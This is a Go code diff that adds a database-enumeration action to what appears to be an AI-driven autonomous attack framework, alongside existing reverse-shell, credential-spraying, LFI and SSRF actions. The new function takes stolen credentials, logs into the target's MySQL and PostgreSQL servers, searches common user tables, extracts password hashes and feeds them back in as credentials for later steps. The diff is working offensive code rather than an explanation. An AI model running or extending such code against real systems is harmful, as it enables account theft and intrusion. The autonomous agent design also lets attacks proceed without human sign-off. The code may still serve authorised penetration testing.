@@ -270,6 +270,8 @@ func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*
 		return r.actionReverseShell(ctx, action, decision)
 	case "cred_spray":
 		return r.actionCredSpray(ctx, action, decision)
+	case "db_enum":
+		return r.actionDBEnum(ctx, action, decision)
 	case "lfi_exploit":
 		return r.actionLFI(ctx, action, decision)
 	case "ssrf_exploit":
@@ -2004,6 +2006,263 @@ func (r *AutoRunner) tryFTPCreds(host string, port int, user, pass string) bool 
 	return strings.HasPrefix(resp, "230")
 }
 
+// actionDBEnum enumerates databases and extracts password hashes after credential access
+func (r *AutoRunner) actionDBEnum(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := extractHost(decision.Target)
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("\n=== DATABASE ENUMERATION: %s ===\n\n", target))
+
+	totalHashes := 0
+
+	// Try MySQL enumeration with discovered credentials
+	for _, cred := range r.state.Credentials {
+		if cred.Service == "mysql" && strings.Contains(cred.Target, target) && cred.Username != "" && cred.Password != "" {
+			sb.WriteString(fmt.Sprintf("--- MySQL Enumeration as %s ---\n", cred.Username))
+
+			dsn := fmt.Sprintf("%s:%s@tcp(%s:3306)/", cred.Username, cred.Password, target)
+			db, err := sql.Open("mysql", dsn)
+			if err != nil {
+				sb.WriteString(fmt.Sprintf("Connection error: %v\n", err))
+				continue
+			}
+			defer db.Close()
+
+			db.SetConnMaxLifetime(10 * time.Second)
+			db.SetMaxOpenConns(1)
+
+			// List databases
+			databases, err := db.Query("SHOW DATABASES")
+			if err == nil {
+				sb.WriteString("Databases found:\n")
+				var dbList []string
+				for databases.Next() {
+					var dbName string
+					databases.Scan(&dbName)
+					sb.WriteString(fmt.Sprintf("  - %s\n", dbName))
+					dbList = append(dbList, dbName)
+				}
+				databases.Close()
+
+				// Look for user tables with hashes in each database
+				for _, dbName := range dbList {
+					if dbName == "information_schema" || dbName == "performance_schema" || dbName == "sys" {
+						continue
+					}
+
+					// Try common user tables
+					userTables := []string{"users", "user", "accounts", "members", "admins", "logins", "credentials"}
+					for _, table := range userTables {
+						query := fmt.Sprintf("SELECT * FROM %s.%s LIMIT 10", dbName, table)
+						rows, err := db.Query(query)
+						if err != nil {
+							continue
+						}
+
+						columns, _ := rows.Columns()
+						sb.WriteString(fmt.Sprintf("\n[+] Found table: %s.%s\n", dbName, table))
+						sb.WriteString(fmt.Sprintf("    Columns: %v\n", columns))
+
+						// Look for password/hash columns
+						for rows.Next() {
+							values := make([]interface{}, len(columns))
+							valuePtrs := make([]interface{}, len(columns))
+							for i := range values {
+								valuePtrs[i] = &values[i]
+							}
+							rows.Scan(valuePtrs...)
+
+							// Extract username and hash columns
+							var username, hash string
+							for i, col := range columns {
+								colLower := strings.ToLower(col)
+								val := ""
+								if values[i] != nil {
+									switch v := values[i].(type) {
+									case []byte:
+										val = string(v)
+									case string:
+										val = v
+									default:
+										val = fmt.Sprintf("%v", v)
+									}
+								}
+
+								if colLower == "username" || colLower == "user" || colLower == "login" || colLower == "email" {
+									username = val
+								}
+								if colLower == "password" || colLower == "password_hash" || colLower == "pass" || colLower == "hash" || colLower == "passwd" {
+									hash = val
+								}
+							}
+
+							if hash != "" && len(hash) >= 32 {
+								sb.WriteString(fmt.Sprintf("    [HASH] %s: %s\n", username, hash))
+								totalHashes++
+
+								// Add to credentials as hash
+								r.state.Credentials = append(r.state.Credentials, CredentialFind{
+									Username: username,
+									Hash:     hash,
+									Service:  "mysql_hash",
+									Target:   fmt.Sprintf("%s:3306", target),
+								})
+
+								if r.callbacks.OnCredential != nil {
+									r.callbacks.OnCredential(CredentialFind{
+										Username: username,
+										Hash:     hash,
+										Service:  "mysql_hash",
+										Target:   fmt.Sprintf("%s:3306", target),
+									})
+								}
+							}
+						}
+						rows.Close()
+					}
+				}
+			}
+			break // Only use first working credential
+		}
+	}
+
+	// Try PostgreSQL enumeration with discovered credentials
+	for _, cred := range r.state.Credentials {
+		if cred.Service == "postgres" && strings.Contains(cred.Target, target) && cred.Username != "" && cred.Password != "" {
+			sb.WriteString(fmt.Sprintf("\n--- PostgreSQL Enumeration as %s ---\n", cred.Username))
+
+			connStr := fmt.Sprintf("host=%s port=5432 user=%s password=%s dbname=postgres sslmode=disable connect_timeout=10",
+				target, cred.Username, cred.Password)
+			db, err := sql.Open("postgres", connStr)
+			if err != nil {
+				sb.WriteString(fmt.Sprintf("Connection error: %v\n", err))
+				continue
+			}
+			defer db.Close()
+
+			// List databases
+			databases, err := db.Query("SELECT datname FROM pg_database WHERE datistemplate = false")
+			if err == nil {
+				sb.WriteString("Databases found:\n")
+				var dbList []string
+				for databases.Next() {
+					var dbName string
+					databases.Scan(&dbName)
+					sb.WriteString(fmt.Sprintf("  - %s\n", dbName))
+					dbList = append(dbList, dbName)
+				}
+				databases.Close()
+
+				// List tables and look for user data
+				tables, err := db.Query(`SELECT table_schema, table_name FROM information_schema.tables
+					WHERE table_schema NOT IN ('pg_catalog', 'information_schema')`)
+				if err == nil {
+					for tables.Next() {
+						var schema, tableName string
+						tables.Scan(&schema, &tableName)
+
+						tableLower := strings.ToLower(tableName)
+						if tableLower == "users" || tableLower == "accounts" || tableLower == "members" || strings.Contains(tableLower, "user") {
+							sb.WriteString(fmt.Sprintf("\n[+] Found table: %s.%s\n", schema, tableName))
+
+							// Query table for hashes
+							query := fmt.Sprintf("SELECT * FROM %s.%s LIMIT 10", schema, tableName)
+							rows, err := db.Query(query)
+							if err != nil {
+								continue
+							}
+
+							columns, _ := rows.Columns()
+							sb.WriteString(fmt.Sprintf("    Columns: %v\n", columns))
+
+							for rows.Next() {
+								values := make([]interface{}, len(columns))
+								valuePtrs := make([]interface{}, len(columns))
+								for i := range values {
+									valuePtrs[i] = &values[i]
+								}
+								rows.Scan(valuePtrs...)
+
+								var username, hash string
+								for i, col := range columns {
+									colLower := strings.ToLower(col)
+									val := ""
+									if values[i] != nil {
+										switch v := values[i].(type) {
+										case []byte:
+											val = string(v)
+										case string:
+											val = v
+										default:
+											val = fmt.Sprintf("%v", v)
+										}
+									}
+
+									if colLower == "username" || colLower == "user" || colLower == "login" || colLower == "email" {
+										username = val
+									}
+									if colLower == "password" || colLower == "password_hash" || colLower == "pass" || colLower == "hash" {
+										hash = val
+									}
+								}
+
+								if hash != "" && len(hash) >= 32 {
+									sb.WriteString(fmt.Sprintf("    [HASH] %s: %s\n", username, hash))
+									totalHashes++
+
+									r.state.Credentials = append(r.state.Credentials, CredentialFind{
+										Username: username,
+										Hash:     hash,
+										Service:  "postgres_hash",
+										Target:   fmt.Sprintf("%s:5432", target),
+									})
+
+									if r.callbacks.OnCredential != nil {
+										r.callbacks.OnCredential(CredentialFind{
+											Username: username,
+											Hash:     hash,
+											Service:  "postgres_hash",
+											Target:   fmt.Sprintf("%s:5432", target),
+										})
+									}
+								}
+							}
+							rows.Close()
+						}
+					}
+					tables.Close()
+				}
+			}
+			break
+		}
+	}
+
+	sb.WriteString(fmt.Sprintf("\n=== ENUMERATION COMPLETE: %d hashes extracted ===\n", totalHashes))
+
+	// Add finding if hashes were found
+	if totalHashes > 0 {
+		finding := Finding{
+			Type:        "database_hash_extraction",
+			Severity:    "high",
+			Target:      target,
+			Description: fmt.Sprintf("Extracted %d password hashes from database", totalHashes),
+			Evidence:    sb.String(),
+			Remediation: "Use strong hashing algorithms (bcrypt, scrypt), encrypt sensitive data at rest",
+			Timestamp:   time.Now(),
+		}
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, finding)
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(finding)
+		}
+	}
+
+	action.Result = sb.String()
+	action.Success = totalHashes > 0
+	action.Data["hashes_found"] = totalHashes
+
+	return action, nil
+}
 
 // actionLFI tests for Local File Inclusion vulnerabilities
 func (r *AutoRunner) actionLFI(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
